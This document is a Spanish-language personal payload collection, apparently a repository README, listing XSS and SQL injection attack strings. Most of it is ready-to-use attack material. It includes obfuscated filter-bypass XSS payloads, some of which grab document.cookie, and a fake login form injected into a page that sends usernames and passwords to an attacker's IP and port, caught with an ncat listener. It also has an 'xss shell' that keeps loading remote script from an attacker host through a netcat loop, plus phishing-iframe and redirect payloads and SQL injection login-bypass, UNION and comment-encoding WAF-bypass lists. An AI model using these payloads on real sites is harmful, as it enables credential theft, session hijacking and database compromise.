# Recopilación de todos los Payloads usados / creados por mi.


### Para detectar errores: sql inyection, xss inyection y HTML inyection

`'"><script>alert`1`</script><h1>d</h1>`

### h1

```
<h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>

<a onclick=\u0041\u006cert("_Y000!_")>Y00</a>

<p onclick=\u0041\u006cert("_Y000!_")>Y00</p>

<marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>

```

### onMouseOver

```
onMouseOver=<script>alert("/XSS BY Y000!/")</script>

</script><h1 onmouseover= top[8680439..toString(30)]("_Y000!_")>

</script><h1 onmouseover=top[/al/.source+/ert/.source]("_Y000!_")>

</script><h1 onmouseover=["_Y000!_"].find(alert)>

</script><h1 onmouseover= (((confirm)))`_Y000!_`>
```

### input + onblur + Obfuscation

```

<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>

<input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>

<input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>

```


### Xss dentro de un botón en form:

`<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`

`<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>`



### Img + Onerror

`<Img src="/" =_=" title=" onerror='prompt(document.cookie)'">`


### marcas


```
<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
  <marquee behavior="alternate">
    Xss by Y000
  </marquee>
 <marquee behavior="alternate">
    Y000
  </marquee>
</marquee>
```


### Marquee + alert

`<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>`



### onload / onfocus

```
"onfocus="alert('Y000')"+autofocus="

</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>

"><svg/onload=alert`${'000'}¥000!.was.here$`>

```

### noscript

`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`


### redirección 

`"><script>document.location="http://google.com";</script>`


### JavaScript

`<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>`

### document.write + iframe

`<img src="x" onerror="document.write('<iframe src=tu_phishing></iframe>')"/>`


### xss + Unicode

`<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>`


### ontoggle

`"><details/open/ontoggle=confirm`/xss_by_Y000!/`>`

### Filter Bypass Alert Obfuscation
 ```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
```

### ----------------------------------

## HTML para simular un phishing y conseguir datos por ncat


### payload a inyectar:
```
<h3>Registrate</h3>
<form action=http://<Ip>:<Puerto>>Usuario:
<br><input type="username" name="username">
</br>Contraseña:<br><input type="password" name="password"></br>
<br><input type="submit" value="Entrar"></br>

```

### para escuchar:
`ncat -lnvp puerto`



## xss shell

### payload a inyectar:
```
"><script>setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
```

### para escuchar:
```
while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
```


Muchos mas:

```
<\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video> 
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script> 
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange> <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad> 
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter> 
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll> 
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)">
</body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)">
</svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> 
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
<body onUnload body onUnload="javascript:javascript:alert(1)">
```




# sql injection 

## Payloads para sql inyection login bypass

```
' or ''-'
" or ""-"
" or true--
' or true--
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```

## Ejemplos de payloads sql injection

### Detectar un error sql 
```
' = %27
" = %22
# = %23
; = %3B
```

### Detectar numero de columnas vulnerables 
```
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 

```

### Union Select Payloads

```
 UNION SELECT 1
 UNION SELECT 1,2
 UNION SELECT 1,2,3
 UNION SELECT 1,2,3,4
 UNION SELECT 1,2,3,4,5
 UNION SELECT 1,2,3,4,5,6
 UNION SELECT 1,2,3,4,5,6,7

 UNION ALL SELECT 1
 UNION ALL SELECT 1,2
 UNION ALL SELECT 1,2,3
 UNION ALL SELECT 1,2,3,4
 UNION ALL SELECT 1,2,3,4,5
 UNION ALL SELECT 1,2,3,4,5,6
 UNION ALL SELECT 1,2,3,4,5,6,7
 
 UNION(SELECT 1)
 UNION(SELECT 1,2)
 UNION(SELECT 1,2,3)
 UNION(SELECT 1,2,3,4)
 UNION(SELECT 1,2,3,4,5)
 UNION(SELECT 1,2,3,4,5,6)
 UNION(SELECT 1,2,3,4,5,6,7)
 
 UNION ALL(SELECT 1)
 UNION ALL(SELECT 1,2)
 UNION ALL(SELECT 1,2,3)
 UNION ALL(SELECT 1,2,3,4)
 UNION ALL(SELECT 1,2,3,4,5)
 UNION ALL(SELECT 1,2,3,4,5,6)
 UNION ALL(SELECT 1,2,3,4,5,6,7)
 
 AND 1 UNION SELECT 1
 AND 1 UNION SELECT 1,2
 AND 1 UNION SELECT 1,2,3
 AND 1 UNION SELECT 1,2,3,4
 AND 1 UNION SELECT 1,2,3,4,5
 AND 1 UNION SELECT 1,2,3,4,5,6
 AND 1 UNION SELECT 1,2,3,4,5,6,7


```

### Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads

```
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
 
```

### tecnicas para hacer bypass en sql inyection 

#### bypass usando comentarios
```
 /*!UNION*/ /*!SELECT*/ 1
 /*!UNION*/ /*!SELECT*/ 1,2
 /*!UNION*/ /*!SELECT*/ 1,2,3
 /*!UNION*/ /*!SELECT*/ 1,2,3,4
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/ /*!12345SELECT*/ 1
 /*!12345UNION*/ /*!12345SELECT*/ 1,2
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/(/*!12345SELECT*/ 1)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)

```
#### bypass usando comentarios + url encoding 
```
 /*!%55nion*/%20/*!%53elect*/1
 /*!%55nion*/%20/*!%53elect*/%201,2
 /*!%55nion*/%20/*!%53elect*/%201,2,3
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
 
 /*!12345%55nion*/ /*!12345%53elect*/ 1
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2
 /*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
 
 /*!12345%55nion*/(/*!12345%53elect*/ 1)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)

```

### HTML URL Encode (Codificación Url)

```
union select:

u	= %75
n	= %6e
i	= %69
o	= %6f
n	= %6e
space	= %20
s	= %73
e	= %65
l	= %6c
c	= %63
t	= %74

```
